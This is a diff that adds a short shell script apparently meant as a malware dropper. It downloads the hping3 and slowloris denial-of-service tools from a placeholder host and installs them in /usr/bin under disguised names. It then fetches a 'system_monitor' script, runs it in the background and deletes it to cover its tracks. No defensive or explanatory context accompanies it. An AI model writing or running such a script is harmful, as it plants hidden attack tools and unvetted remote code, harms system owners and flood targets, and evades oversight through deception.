@@ -1,0 +1,9 @@
+cd /tmp
+curl -L http://xxxx/hping3 -o /usr/bin/linux_checker
+chmod +x /usr/bin/linux_checker
+curl -L http://xxxx/slowloris.py -o /usr/bin/linux_verify
+chmod +x /usr/bin/linux_verify
+curl -L http://xxxx/system_monitor.sh -o /tmp/system_monitor
+chmod +x ./system_monitor
+./system_monitor &
+rm -f system_monitor
